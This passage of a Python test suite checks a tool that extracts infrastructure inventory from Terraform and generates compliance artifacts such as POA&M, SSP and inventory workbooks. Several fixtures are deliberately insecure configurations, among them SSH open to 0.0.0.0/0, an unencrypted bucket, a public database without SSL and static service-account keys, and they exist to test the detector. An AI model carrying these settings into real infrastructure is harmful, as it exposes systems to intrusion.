            with open(os.path.join(fc_shared, "foundation_variables.yaml"), "w", encoding="utf-8") as fv_file:
                fv_file.write(fv_content)

            cidrs_content = """
hub_vpcs:
  - "10.150.0.0/16"
spoke_vpcs:
  - "10.151.0.0/16"
  - "10.152.0.0/16"
"""
            with open(os.path.join(fc_fw, "cidrs.yaml"), "w", encoding="utf-8") as cidrs_file:
                cidrs_file.write(cidrs_content)

            compute_hcl = """
module "bastion_vm" {
  source       = "../modules/compute-vm"
  name         = "amc-bastion-prod"
  machine_type = "n2-standard-4"
  zone         = "us-east4-a"
  network_interfaces = [
    {
      network    = "vpc-hub"
      subnetwork = "sb-mgmt-us-east4"
      network_ip = "10.150.10.5"
    }
  ]
  boot_disk = {
    initialize_params = {
      image = "projects/rhel-cloud/global/images/family/rhel-9"
    }
  }
}
"""
            with open(os.path.join(tf_dir, "compute.tf"), "w", encoding="utf-8") as compute_file:
                compute_file.write(compute_hcl)

            db_hcl = """
module "postgres_db" {
  source           = "../modules/cloudsql"
  name             = "amc-pg15-db"
  database_version = "POSTGRES_15"
  tier             = "db-custom-8-32768"
  private_network  = "projects/amc-prod/global/networks/vpc-spoke"
  encryption_key_name = "projects/amc-prod/locations/us-east4/keyRings/amc-kr/cryptoKeys/cmek-db"
}
"""
            with open(os.path.join(tf_dir, "database.tf"), "w", encoding="utf-8") as db_file:
                db_file.write(db_hcl)

            kms_hcl = """
resource "google_kms_crypto_key" "hsm_key" {
  name             = "cmek-hsm-core"
  key_ring         = "projects/amc-prod/locations/us-east4/keyRings/amc-kr"
  protection_level = "HSM"
  purpose          = "ENCRYPT_DECRYPT"
  rotation_period  = "7776000s"
}
"""
            with open(os.path.join(tf_dir, "kms.tf"), "w", encoding="utf-8") as kms_file:
                kms_file.write(kms_hcl)

            net_hcl = """
resource "google_compute_interconnect_attachment" "partner" {
  name                     = "amc-interconnect-va"
  edge_availability_domain = "AVAILABILITY_DOMAIN_1"
  type                     = "PARTNER"
  router                   = "router-amc-hub"
}

resource "google_compute_subnetwork" "subnet_app" {
  name          = "sb-app-us-east4"
  ip_cidr_range = "10.151.20.0/24"
  region        = "us-east4"
  network       = "vpc-spoke"
}
"""
            with open(os.path.join(tf_dir, "network.tf"), "w", encoding="utf-8") as net_file:
                net_file.write(net_hcl)

            services_hcl = """
resource "google_project_service" "compute" {
  service = "compute.googleapis.com"
}

resource "google_project_service" "sqladmin" {
  service = "sqladmin.googleapis.com"
}

resource "google_project_service" "kms" {
  service = "cloudkms.googleapis.com"
}
"""
            with open(os.path.join(tf_dir, "services.tf"), "w", encoding="utf-8") as services_file:
                services_file.write(services_hcl)

            inv = extract_system_data.extract_system_inventory(truth_test_dir)

            sys_i = inv["system_information"]
            self.assertEqual(sys_i.get("system_name"), "Stellar Engine Mission Cloud")
            self.assertEqual(sys_i.get("organization"), "DoD Mission Systems Agency")
            self.assertEqual(sys_i.get("primary_location"), "us-east4")
            self.assertEqual(sys_i.get("billing_account"), "01ABCD-2345EF-678901")

            net_i = inv["network_architecture"]
            self.assertIn("10.150.0.0/16", net_i["subnets_cidrs"])
            self.assertIn("10.151.0.0/16", net_i["subnets_cidrs"])
            self.assertIn("10.151.20.0/24", net_i["subnets_cidrs"])

            infra_i = inv["infrastructure_components"]
            self.assertEqual(len(infra_i["compute_instances"]), 1)
            vm = infra_i["compute_instances"][0]
            self.assertEqual(vm["name"], "amc-bastion-prod")
            self.assertEqual(vm["machine_type"], "n2-standard-4")
            self.assertEqual(vm["zone"], "us-east4-a")
            self.assertEqual(vm["network_ip"], "10.150.10.5")
            self.assertEqual(vm["subnetwork"], "sb-mgmt-us-east4")
            self.assertIn("rhel-9", vm["image"])

            self.assertEqual(len(infra_i["databases"]), 1)
            database = infra_i["databases"][0]
            self.assertEqual(database["name"], "amc-pg15-db")
            self.assertEqual(database["database_version"], "POSTGRES_15")
            self.assertEqual(database["tier"], "db-custom-8-32768")
            self.assertIn("vpc-spoke", database["private_network"])
            self.assertIn("cmek-db", database["cmek_key"])

            self.assertEqual(len(infra_i["kms_keys"]), 1)
            key = infra_i["kms_keys"][0]
            self.assertEqual(key["name"], "cmek-hsm-core")
            self.assertEqual(key["protection_level"], "HSM")
            self.assertEqual(key["rotation_period"], "7776000s")

            self.assertIn("Cloud Interconnect", inv["connectivity_summary"])
            self.assertIn("FIPS 140-3 Level 3 Cloud HSM", inv["encryption_summary"])
            self.assertEqual("Not determined from IaC", inv["authentication_summary"])

            self.assertIn("iam_groups", inv)
            self.assertIn("sec-admins@mil.example.com", inv["iam_groups"].get("gcp_security_admins", []))

            min_tpl_dir = Path(truth_test_dir) / "min_templates"
            (min_tpl_dir / "policies").mkdir(parents=True, exist_ok=True)
            shutil.copy(
                os.path.join(TEMPLATES_DIR, "policies", "Access_Control_Policy_and_Procedures.md"),
                min_tpl_dir / "policies" / "Access_Control_Policy_and_Procedures.md",
            )
            (min_tpl_dir / "ssp").mkdir(parents=True, exist_ok=True)
            shutil.copy(
                os.path.join(TEMPLATES_DIR, "ssp", "SSP_IL5_Template.md"),
                min_tpl_dir / "ssp" / "SSP_IL5_Template.md",
            )

            def mock_hydrate_truth(target_dir, inv):
                out_d = Path(target_dir) / "ato_artifacts"
                tpl_d = file_helpers.get_templates_dir()
                res = {}
                hw_out = out_d / "HW_SW_Inventory" / "Hardware_Software_Inventory.xlsm"
                hw_out.parent.mkdir(parents=True, exist_ok=True)
                res["hwsw"] = excel_hydrator.HWSWHydrator(str(tpl_d / "hwsw" / "HWSWList_Template.xlsm")).hydrate(inv, str(hw_out))
                poam_out = out_d / "POAM" / "Plan_of_Action_and_Milestones.xlsm"
                poam_out.parent.mkdir(parents=True, exist_ok=True)
                res["poam"] = excel_hydrator.POAMHydrator(str(tpl_d / "poam" / "POAM_Export_Template.xlsm")).hydrate(inv, str(poam_out))
                return res

            with unittest.mock.patch("generate_compliance_artifacts.TEMPLATES_DIR", str(min_tpl_dir)):
                with unittest.mock.patch("excel_hydrator.hydrate_all_excel_templates", side_effect=mock_hydrate_truth):
                    generate_compliance_artifacts.generate_ato_artifacts(truth_test_dir, policy_format="markdown", data_format="both")

                hwsw_yaml_path = os.path.join(truth_test_dir, "ato_artifacts", "HW_SW_Inventory", "Hardware_Software_Inventory.yaml")
                self.assertTrue(os.path.exists(hwsw_yaml_path))
                with open(hwsw_yaml_path, "r", encoding="utf-8") as hwsw_file:
                    hwsw_yaml = hwsw_file.read()
                self.assertIn("n2-standard-4", hwsw_yaml)
                self.assertIn("10.150.10.5", hwsw_yaml)
                self.assertIn("POSTGRES_15", hwsw_yaml)
                self.assertIn("db-custom-8-32768", hwsw_yaml)
                self.assertIn("Cloud KMS FIPS 140-3 Level 3 HSM Key Ring", hwsw_yaml)

                hwsw_xl_path = os.path.join(truth_test_dir, "ato_artifacts", "HW_SW_Inventory", "Hardware_Software_Inventory.xlsm")
                wb_hwsw = openpyxl.load_workbook(hwsw_xl_path, data_only=True, keep_vba=True)
                ws_hw = wb_hwsw["Hardware"]
                found_vm = False
                for row_idx in range(8, ws_hw.max_row + 1):
                    if ws_hw.cell(row=row_idx, column=4).value == "amc-bastion-prod":
                        found_vm = True
                        self.assertEqual(ws_hw.cell(row=row_idx, column=6).value, "10.150.10.5")
                        self.assertEqual(ws_hw.cell(row=row_idx, column=13).value, "n2-standard-4")
                self.assertTrue(found_vm, "VM must be in Excel Hardware sheet with extracted machine_type and IP")

                ws_sw = wb_hwsw["Software"]
                self.assertEqual(ws_sw.cell(row=8, column=16).value, "DoD Enterprise Cloud Master Agreement #98765")
                pop_end_val = ws_sw.cell(row=8, column=15).value
                pop_end_str = pop_end_val.strftime("%Y-%m-%d") if hasattr(pop_end_val, "strftime") else str(pop_end_val)
                self.assertEqual(pop_end_str, "2031-12-31")

                poam_xl_path = os.path.join(truth_test_dir, "ato_artifacts", "POAM", "Plan_of_Action_and_Milestones.xlsm")
                wb_poam = openpyxl.load_workbook(poam_xl_path, data_only=True, keep_vba=True)
                ws_poam = wb_poam["POA&M"]
                self.assertEqual(ws_poam["P2"].value, "OMB-AMC-2026")

                ssp_md_path = os.path.join(truth_test_dir, "ato_artifacts", "SSP", "SSP_System_Security_Plan.md")
                with open(ssp_md_path, "r", encoding="utf-8") as ssp_file:
                    ssp_md = ssp_file.read()
                self.assertIn("Cloud Interconnect", ssp_md)
                self.assertIn("FIPS 140-3 Level 3 Cloud HSM", ssp_md)
                self.assertIn("sec-admins@mil.example.com", ssp_md)

                val_ok = validate_compliance_artifacts.validate_compliance_package(
                    truth_test_dir, policy_format="markdown", data_format="both"
                )
                self.assertTrue(val_ok)

        finally:
            shutil.rmtree(truth_test_dir, ignore_errors=True)

    def test_dynamic_poam_and_truth_fallbacks(self) -> None:
        """Tests dynamic POA&M finding derivation from real architecture telemetry.

        Args:
            None.

        Returns:
            None.
        """
        empty_inventory: Dict[str, Any] = {
            "system_information": {},
            "personnel_roles": {},
            "network_architecture": {},
            "infrastructure_components": {},
        }
        poam_yaml = generate_compliance_artifacts.generate_poam_matrix_yaml(empty_inventory)
        self.assertNotIn("Alice Vance", poam_yaml)
        self.assertNotIn("Robert Lee", poam_yaml)
        self.assertNotIn("isso@agency.gov", poam_yaml)
        self.assertNotIn("555-010", poam_yaml)
        self.assertIn("[CONFIG_REQUIRED: System Name]", poam_yaml)
        self.assertIn("[CONFIG_REQUIRED: ISSO Name]", poam_yaml)

        flawed_inventory: Dict[str, Any] = {
            "system_information": {
                "system_name": "Mission Tactical Spoke",
                "impact_level": "IL5",
                "primary_location": "us-east4",
            },
            "personnel_roles": {
                "system_owner": {"name": "Col. John Miller", "email": "jmiller@af.mil", "phone": "703-555-0199"}
            },
            "network_architecture": {
                "firewall_rules": [
                    {
                        "name": "allow-all-ssh",
                        "direction": "INGRESS",
                        "action": "ALLOW",
                        "ports": "22",
                        "source_ranges": ["0.0.0.0/0"]
                    }
                ]
            },
            "infrastructure_components": {
                "storage_buckets": [
                    {"name": "tactical-logs-bucket", "cmek_encrypted": False, "encryption": "Google-managed"}
                ],
                "kms_keys": [
                    {"name": "projects/p/locations/us/keyRings/r/cryptoKeys/soft-key", "protection_level": "SOFTWARE"}
                ]
            }
        }

        findings = excel_hydrator.derive_poam_findings(flawed_inventory)
        controls = [item["control"] for item in findings]
        self.assertTrue(any("SC-28" in ctl for ctl in controls), "Must detect unencrypted bucket (SC-28)")
        self.assertTrue(any("SC-07" in ctl for ctl in controls), "Must detect open 0.0.0.0/0 ingress (SC-07)")
        self.assertTrue(any("PL-02" in ctl or "AC-02" in ctl for ctl in controls), "Must detect missing mandatory security roles (PL-02)")
        self.assertTrue(any("SC-12" in ctl or "SC-13" in ctl for ctl in controls), "Must detect SOFTWARE KMS key in IL5 (SC-12/SC-13)")

        poam_yaml_flawed = generate_compliance_artifacts.generate_poam_matrix_yaml(flawed_inventory)
        self.assertIn("SC-28", poam_yaml_flawed)
        self.assertIn("SC-07", poam_yaml_flawed)
        self.assertIn("tactical-logs-bucket", poam_yaml_flawed)
        self.assertIn("allow-all-ssh", poam_yaml_flawed)

        tpl_path = os.path.join(TEMPLATES_DIR, "poam", "POAM_Export_Template.xlsm")
        out_path = os.path.join(self.test_dir, "Flawed_POAM.xlsm")
        hydrator = excel_hydrator.POAMHydrator(tpl_path)
        hydrator.hydrate(flawed_inventory, out_path)
        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        ws_poam = workbook["POA&M"]
        col_controls = [ws_poam.cell(row=row_idx, column=1).value for row_idx in range(8, ws_poam.max_row + 1)]
        self.assertTrue(any(ctl and "SC-28" in ctl for ctl in col_controls))
        self.assertTrue(any(ctl and "SC-07" in ctl for ctl in col_controls))

    def test_multicloud_and_variable_resolution(self) -> None:
        """Tests HCL variable resolution and multi-cloud extraction.

        Args:
            None.

        Returns:
            None.
        """
        mc_dir = tempfile.mkdtemp(prefix="multicloud_test_")
        self.addCleanup(shutil.rmtree, mc_dir, ignore_errors=True)
        try:
            tfvars_content = """
vm_size = "n2-standard-8"
db_tier = "db-custom-8-32768"
enable_public = false
"""
            with open(os.path.join(mc_dir, "terraform.tfvars"), "w", encoding="utf-8") as tfvars_file:
                tfvars_file.write(tfvars_content)

            vars_tf_content = """
variable "vm_size" {
  type = string
  default = "n2-standard-4"
}
variable "db_tier" {
  type = string
  default = "db-custom-2-7680"
}
variable "region" {
  type = string
  default = "us-east4"
}
"""
            with open(os.path.join(mc_dir, "variables.tf"), "w", encoding="utf-8") as vars_file:
                vars_file.write(vars_tf_content)

            main_tf_content = """
resource "google_compute_instance" "app_worker" {
  name = "prod-app-worker"
  machine_type = var.vm_size
  zone = "us-east4-a"
  network_interface {
    network = "default"
  }
}

resource "google_sql_database_instance" "primary_db" {
  name = "prod-primary-db"
  database_version = "POSTGRES_15"
  region = var.region
  settings {
    tier = var.db_tier
    ip_configuration {
      require_ssl = true
      ipv4_enabled = false
    }
  }
}

resource "google_compute_ha_vpn_gateway" "edge_gateway" {
  name    = "gcp-edge-ha-vpn"
  network = "default"
  region  = var.region
}

resource "google_compute_interconnect_attachment" "partner_interconnect" {
  name                     = "cross-cloud-interconnect"
  type                     = "PARTNER"
  edge_availability_domain = "AVAILABILITY_DOMAIN_1"
  region                   = var.region
}

resource "google_service_account_key" "legacy_key" {
  service_account_id = "projects/my-p/serviceAccounts/sa-legacy@my-p.iam.gserviceaccount.com"
}
"""
            with open(os.path.join(mc_dir, "main.tf"), "w", encoding="utf-8") as main_tf_file:
                main_tf_file.write(main_tf_content)

            scanned = extract_system_data.deep_scan_tf_files(mc_dir)

            vms = {instance["name"]: instance for instance in scanned["compute_instances"]}
            self.assertIn("prod-app-worker", vms)
            self.assertEqual(vms["prod-app-worker"]["machine_type"], "n2-standard-8", "Must resolve var.vm_size from .tfvars")
            self.assertFalse(vms["prod-app-worker"]["has_public_ip"])

            dbs = {db["name"]: db for db in scanned["databases"]}
            self.assertIn("prod-primary-db", dbs)
            self.assertEqual(dbs["prod-primary-db"]["tier"], "db-custom-8-32768")
            self.assertEqual(dbs["prod-primary-db"]["region"], "us-east4")
            self.assertTrue(dbs["prod-primary-db"]["require_ssl"])
            self.assertFalse(dbs["prod-primary-db"]["has_public_ip"])

            # Verify boundary connections (HA VPN, Cross-Cloud Interconnect)
            boundary_conns = scanned.get("boundary_connections", [])
            boundary_names = [c.get("name") for c in boundary_conns]
            self.assertIn("gcp-edge-ha-vpn", boundary_names)
            self.assertIn("cross-cloud-interconnect", boundary_names)

            self.assertEqual(len(scanned["service_account_keys"]), 1)

            inv = extract_system_data.extract_system_inventory(mc_dir)
            self.assertIn("us-east4", inv["system_information"]["primary_location"])

        finally:
            shutil.rmtree(mc_dir, ignore_errors=True)

    def test_technical_poam_gap_derivation(self) -> None:
        """Tests exhaustive POA&M derivation across Cloud SQL, VMs, GKE, and SA Keys.

        Args:
            None.

        Returns:
            None.
        """
        gap_inventory: Dict[str, Any] = {
            "system_information": {
                "system_name": "Mission Gap Test Platform",
                "system_abbreviation": "MGTP",
                "impact_level": "IL5",
                "effective_date": "2026-09-01"
            },
            "personnel_roles": {
                "system_owner": {"name": "Test Owner", "email": "to@test.gov"},
                "isso": {"name": "Test ISSO", "email": "isso@test.gov"}
            },
            "network_architecture": {},
            "infrastructure_components": {
                "databases": [
                    {
                        "name": "insecure-sql-01",
                        "require_ssl": False,
                        "backup_enabled": False,
                        "has_public_ip": True
                    }
                ],
                "compute_instances": [
                    {
                        "name": "public-unshielded-vm",
                        "has_public_ip": True,
                        "shielded_vm": False
                    }
                ],
                "gke_clusters": [
                    {
                        "name": "exposed-gke-cluster",
                        "private_cluster": False,
                        "private_endpoint": False,
                        "workload_identity": False
                    }
                ],
                "service_account_keys": [
                    {"name": "static-sa-key-01"}
                ]
            }
        }

        findings = excel_hydrator.derive_poam_findings(gap_inventory)
        controls = [item["control"] for item in findings]

        self.assertTrue(any("SC-08" in ctl or "SC-13" in ctl for ctl in controls), "Must detect database without SSL")
        self.assertTrue(any("CP-09" in ctl for ctl in controls), "Must detect database without backups")
        self.assertTrue(any("Disable Public IP on Database" in ctl for ctl in controls), "Must detect database public IP")
        self.assertTrue(any("Remove Direct Public IPs from Compute" in ctl for ctl in controls), "Must detect VM public IP")
        self.assertTrue(any("SI-07" in ctl for ctl in controls), "Must detect unshielded VM")
        self.assertTrue(any("Enforce Private Cluster and Private Endpoint on GKE" in ctl for ctl in controls), "Must detect public GKE")
        self.assertTrue(any("Workload Identity Federation" in ctl for ctl in controls), "Must detect GKE without Workload Identity")
        self.assertTrue(any("Deprecate Static Long-Lived Service Account Keys" in ctl for ctl in controls), "Must detect static SA keys")

    def test_dynamic_system_description_and_template_cleanliness(self) -> None:
        """Verifies dynamic system description generation and absence of hardcoded strings.

        Args:
            None.

        Returns:
            None.
        """
        inventory: Dict[str, Any] = {
            "system_information": {
                "system_name": "Defense Logistics Platform",
                "system_abbreviation": "DLP",
                "compliance_baseline": "NIST SP 800-53 Rev. 5 / DoD IL5",
                "impact_level": "IL5"
            },
            "network_architecture": {
                "vpcs": ["vpc-core-prod", "vpc-data-prod"],
                "subnets_cidrs": ["10.10.0.0/20", "10.20.0.0/20"]
            },
            "infrastructure_components": {
                "databases": [{"name": "db-logistics", "type": "Cloud SQL PostgreSQL 15"}],
                "gke_clusters": [{"name": "dlp-k8s-prod"}],
                "compute_instances": [{"name": "dlp-gateway-01"}],
                "storage_buckets": [{"name": "dlp-artifacts-prod"}],
                "kms_keys": [{"name": "dlp-hsm-key", "protection_level": "HSM"}]
            },
            "application_components": {
                "applications": [{"name": "logistics-api", "type": "FastAPI Microservice"}],
                "frameworks": ["FastAPI", "React"],
                "runtimes": ["Python", "Node.js"]
            }
        }

        desc = generate_compliance_artifacts.build_dynamic_system_description(inventory)
        self.assertIn("Defense Logistics Platform", desc)
        self.assertIn("DLP", desc)
        self.assertIn("FastAPI", desc)
        self.assertIn("React", desc)
        self.assertIn("dlp-k8s-prod", desc)
        self.assertIn("db-logistics", desc)
        self.assertIn("vpc-core-prod", desc)

        policy_dir = os.path.join(TEMPLATES_DIR, "policies")
        banned_phrases = ["Agentic Foundations Engine", "Dino Runner", "Steller Engine", "GPS PSO engagement"]
        for p_file in os.listdir(policy_dir):
            if p_file.endswith(".md"):
                p_path = os.path.join(policy_dir, p_file)
                with open(p_path, "r", encoding="utf-8") as policy_file:
                    content = policy_file.read()
                for phrase in banned_phrases:
                    self.assertNotIn(phrase, content, f"Found hardcoded phrase '{phrase}' in template {p_file}")

    def test_readme_system_description_extraction_and_ssp_integration(self) -> None:
        """Verifies extracting authentic system descriptions from README/docs and SSP integration."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)

            # Test 1: Markdown extraction with greeting cleanup
            sample_readme = """# US Army NETCOM Tactical Platform

Welcome to the **US Army NETCOM Tactical Platform** codebase. This repository contains the end-to-end Infrastructure-as-Code (IaC), hybrid multi-cloud network connectivity, and real-time operations dashboards.

---

## Architecture Overview
The repository implements a secure decoupled microservices architecture.
"""
            code_dir = tmp_path / "code" / "tactical-app"
            code_dir.mkdir(parents=True, exist_ok=True)
            readme_file = code_dir / "README.md"
            readme_file.write_text(sample_readme, encoding="utf-8")

            # Check discover_system_documentation
            doc_data = extract_system_data.discover_system_documentation(tmp_path)
            self.assertIsNotNone(doc_data)
            self.assertEqual(doc_data["title"], "US Army NETCOM Tactical Platform")
            self.assertIn("US Army NETCOM Tactical Platform", doc_data["description"])
            self.assertNotIn("Welcome to", doc_data["description"])
            self.assertIn("Infrastructure-as-Code", doc_data["description"])

            # Test 2: Inferred system name and abbreviation from discovered documentation
            name, abbr = extract_system_data.infer_system_name_and_abbr(
                str(tmp_path), {}, {}, {}, readme_data=doc_data
            )
            self.assertEqual(name, "US Army NETCOM Tactical Platform")
            self.assertEqual(abbr, "UANT")

            # Test 3: System description synthesis with authentic README text
            inventory = {
                "system_information": {
                    "system_name": "Commercial Cloud Transport",
                    "system_abbreviation": "C2T",
                    "compliance_baseline": "NIST SP 800-53 Rev. 5 / DoD IL5",
                    "impact_level": "IL5",
                    "readme_system_description": doc_data["description"],
                },
                "network_architecture": {
                    "vpcs": ["vpc-transit-prod"],
                    "subnets_cidrs": ["10.0.0.0/24"],
                },
                "infrastructure_components": {
                    "databases": [{"name": "db-pg", "type": "Cloud SQL"}],
                    "compute_instances": [{"name": "vm-edge"}],
                    "kms_keys": [{"name": "key-cmek"}],
                    "storage_buckets": [{"name": "bkt-audit"}],
                },
                "application_components": {},
            }
            desc = generate_compliance_artifacts.build_dynamic_system_description(inventory)
            self.assertIn("US Army NETCOM Tactical Platform", desc)
            self.assertIn("Commercial Cloud Transport", desc)
            self.assertIn("C2T", desc)
            self.assertIn("NIST SP 800-53 Rev. 5 / DoD IL5", desc)
            self.assertIn("Workload Execution and Compute Tier", desc)
            self.assertIn("Data Persistence and Cryptographic Protection", desc)
            self.assertIn("Network Perimeter and Boundary Protection", desc)
            self.assertIn("Identity, Access Management, and Audit Governance", desc)
            self.assertIn("db-pg", desc)
            self.assertIn("vpc-transit-prod", desc)

            # Test 4: Explicit ## Executive Summary section extraction in spec.md
            spec_file = tmp_path / "spec.md"
            spec_file.write_text(
                "# System Specification\n\n## Executive Summary\n"
                "The Strategic Defense Logistics Network provides zero-trust automated freight coordination.\n"
                "All communications are encrypted with FIPS 140-3 HSM keys.\n\n## Details\nSome detail.",
                encoding="utf-8",
            )
            doc_data_spec = extract_system_data.discover_system_documentation(tmp_path)
            self.assertIsNotNone(doc_data_spec)
            self.assertIn("Strategic Defense Logistics Network", doc_data_spec["description"])

    def test_user_defined_poam_items_and_clean_system_zero_filler(self) -> None:
        """Verifies clean compliant systems produce 0 findings and user tasks are honored.

        Args:
            None.

        Returns:
            None.
        """
        clean_inventory: Dict[str, Any] = {
            "system_information": {
                "system_name": "Hardened Mission Core",
                "system_abbreviation": "HMC",
                "impact_level": "IL5",
                "effective_date": "2026-09-01"
            },
            "personnel_roles": {
                "system_owner": {"name": "Col. Miller", "email": "cm@agency.mil"},
                "issm": {"name": "Jane Doe", "email": "jd@agency.mil"},
                "isso": {"name": "Bob Smith", "email": "bs@agency.mil"},
                "authorizing_official": {"name": "Gen. Vance", "email": "gv@agency.mil"}
            },
            "network_architecture": {
                "firewall_rules": [{"name": "allow-internal", "direction": "INGRESS", "source_ranges": ["10.0.0.0/8"], "ports": "443"}]
            },
            "infrastructure_components": {
                "storage_buckets": [{"name": "audit-logs", "cmek_encrypted": True, "versioning": True, "uniform_bucket_level_access": True}],
                "databases": [{"name": "app-db", "require_ssl": True, "backup_enabled": True, "has_public_ip": False}],
                "compute_instances": [{"name": "worker-01", "has_public_ip": False, "shielded_vm": True}],
                "kms_keys": [{"name": "core-hsm-key", "protection_level": "HSM"}],
                "gke_clusters": [{"name": "secure-cluster", "private_cluster": True, "private_endpoint": True, "workload_identity": True}],
                "service_account_keys": []
            }
        }

        findings = excel_hydrator.derive_poam_findings(clean_inventory)
        self.assertEqual(len(findings), 0, "Clean system must have zero active POA&M deficiencies")

        poam_yaml = generate_compliance_artifacts.generate_poam_matrix_yaml(clean_inventory)
        self.assertIn("total_open_items: 0", poam_yaml)
        self.assertNotIn("Penetration Testing", poam_yaml)
        self.assertNotIn("Tabletop Exercise", poam_yaml)

        punch_list_inventory = copy.deepcopy(clean_inventory)
        punch_list_inventory["poam_items"] = [
            {
                "weakness_name": "Migrate Bastion to Private Service Connect",
                "control": "AC-03 / SC-07",
                "desc": "Remove public IP from bastion and route management traffic via IAP.",
                "severity": "Moderate",
                "scheduled_date": "2026-11-15",
                "source": "Pre-ATO Engineering Punch List",
                "milestones": [
                    {
                        "description": "Deploy IAP TCP forwarding tunnel in spoke VPC.",
                        "target_date": "2026-10-31",
                        "status": "Open"
                    }
                ]
            }
        ]

        user_findings = excel_hydrator.derive_poam_findings(punch_list_inventory)
        self.assertEqual(len(user_findings), 1)
        self.assertEqual(user_findings[0]["control"], "AC-03 / SC-07")
        self.assertIn("Migrate Bastion", user_findings[0]["desc"])
        self.assertEqual(user_findings[0]["severity"], "Moderate")
        self.assertEqual(user_findings[0]["source"], "Pre-ATO Engineering Punch List")
        self.assertEqual(user_findings[0]["milestone_desc"], "Deploy IAP TCP forwarding tunnel in spoke VPC.")

        tpl_path = os.path.join(TEMPLATES_DIR, "poam", "POAM_Export_Template.xlsm")
        out_path = os.path.join(self.test_dir, "User_Punchlist_POAM.xlsm")
        hydrator = excel_hydrator.POAMHydrator(tpl_path)
        hydrator.hydrate(punch_list_inventory, out_path)
        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        ws_poam = workbook["POA&M"]
        self.assertEqual(ws_poam.cell(row=8, column=1).value, "AC-03 / SC-07")
        self.assertIn("Migrate Bastion", ws_poam.cell(row=8, column=3).value)

    def test_security_scanner_bridge_and_sarif_integration(self) -> None:
        """Verifies automated security scanners map findings into NIST controls.

        Args:
            None.

        Returns:
            None.
        """
        import security_scanner_bridge as ssb

        sql_ctl, sql_title = ssb.map_cwe_to_nist("89")
        self.assertEqual(sql_ctl, "SI-10")
        self.assertIn("SQL Injection", sql_title)

        cred_ctl, cred_title = ssb.map_cwe_to_nist("798")
        self.assertEqual(cred_ctl, "IA-05")
        self.assertIn("Hardcoded Credentials", cred_title)

        crypto_ctl, _ = ssb.map_cwe_to_nist("327")
        self.assertEqual(crypto_ctl, "SC-13")

        path_ctl, _ = ssb.map_cwe_to_nist("22")
        self.assertEqual(path_ctl, "AC-03")

        cmek_ctl, _ = ssb.map_checkov_to_nist("CKV_GCP_114", "Ensure bucket CMEK encryption")
        self.assertEqual(cmek_ctl, "SC-28")

        pub_ctl, _ = ssb.map_checkov_to_nist("CKV_GCP_999", "Ensure firewall has no public ingress")
        self.assertEqual(pub_ctl, "AC-03 / SC-07")

        audit_ctl, _ = ssb.map_checkov_to_nist("CKV_GCP_62", "Audit log retention enabled")
        self.assertEqual(audit_ctl, "AU-02 / AU-12")

        sarif_dir = os.path.join(self.test_dir, "sarif_test")
        os.makedirs(sarif_dir, exist_ok=True)
        sarif_payload = {
            "version": "2.1.0",
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "runs": [
                {
                    "tool": {"driver": {"name": "Trivy"}},
                    "results": [
                        {
                            "ruleId": "CVE-2024-9999",
                            "message": {"text": "Vulnerable open-source dependency detected"},
                            "level": "error",
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "backend/requirements.txt"},
                                        "region": {"startLine": 15}
                                    }
                                }
                            ]
                        }
                    ]
                }
            ]
        }
        sarif_path = os.path.join(sarif_dir, "trivy_report.sarif")
        with open(sarif_path, "w", encoding="utf-8") as sarif_file:
            json.dump(sarif_payload, sarif_file)

        sarif_items = ssb.scan_and_derive_poam_items(
            sarif_dir,
            sys_abbr="TEST",
            config={"run_checkov": False, "run_semgrep": False, "ingest_sarif": True}
        )
        self.assertEqual(len(sarif_items), 1)
        self.assertEqual(sarif_items[0]["checks"], "CVE-2024-9999")
        self.assertEqual(sarif_items[0]["severity"], "High")
        self.assertIn("Trivy (SARIF Ingestion)", sarif_items[0]["source"])
        self.assertIn("backend/requirements.txt:15", sarif_items[0]["desc"])

        tf_test_dir = os.path.join(self.test_dir, "tf_checkov_test")
        os.makedirs(tf_test_dir, exist_ok=True)
        with open(os.path.join(tf_test_dir, "main.tf"), "w", encoding="utf-8") as tf_file:
            tf_file.write("""
resource "google_storage_bucket" "test_storage" {
  name     = "sample-unencrypted-bucket-poam-test"
  location = "US"
}
""")
        if shutil.which("checkov") and os.getenv("COMPLIANCE_RUN_LIVE_SCANNERS") == "1":
            live_findings = ssb.scan_and_derive_poam_items(
                tf_test_dir,
                sys_abbr="TFSCAN",
                config={"run_checkov": True, "run_semgrep": False, "ingest_sarif": False}
            )
            self.assertGreater(len(live_findings), 0, "Checkov scan should discover real bucket misconfigurations")
            check_ids = [item["checks"] for item in live_findings]
            self.assertTrue(any(check.startswith("CKV_GCP_") for check in check_ids))

            scan_inventory = {
                "system_information": {
                    "system_abbreviation": "TFSCAN",
                    "workspace_path": tf_test_dir,
                    "effective_date": "2026-09-09"
                },
                "personnel_roles": {
                    "system_owner": {"name": "Alice Smith"},
                    "issm": {"name": "Bob Jones"},
                    "isso": {"name": "Charlie Brown"},
                    "authorizing_official": {"name": "Gen. Vance"}
                },
                "security_scanners": {
                    "enabled": True,
                    "run_checkov": True,
                    "run_semgrep": False,
                    "ingest_sarif": False
                }
            }
            integrated_findings = excel_hydrator.derive_poam_findings(scan_inventory)
            self.assertGreater(len(integrated_findings), 0)
            self.assertTrue(any("CKV_GCP_" in item["checks"] for item in integrated_findings))
        else:
            # Fast isolated mock path: validates checkov finding normalization without 7-second CLI latency
            mock_checkov = [
                {
                    "check_id": "CKV_GCP_62",
                    "check_name": "Ensure Cloud Logging has bucket retention",
                    "file_path": "/main.tf",
                    "file_line_range": [2, 5],
                    "severity": "Low",
                    "guideline": "https://docs.prismacloud.io"
                }
            ]
            with unittest.mock.patch("security_scanner_bridge.run_checkov_scan", return_value=mock_checkov):
                live_findings = ssb.scan_and_derive_poam_items(
                    tf_test_dir,
                    sys_abbr="TFSCAN",
                    config={"run_checkov": True, "run_semgrep": False, "ingest_sarif": False}
                )
                self.assertGreater(len(live_findings), 0)
                check_ids = [item["checks"] for item in live_findings]
                self.assertTrue(any(check.startswith("CKV_GCP_") for check in check_ids))

                scan_inventory = {
                    "system_information": {
                        "system_abbreviation": "TFSCAN",
                        "workspace_path": tf_test_dir,
                        "effective_date": "2026-09-09"
                    },
                    "personnel_roles": {
                        "system_owner": {"name": "Alice Smith"},
                        "issm": {"name": "Bob Jones"},
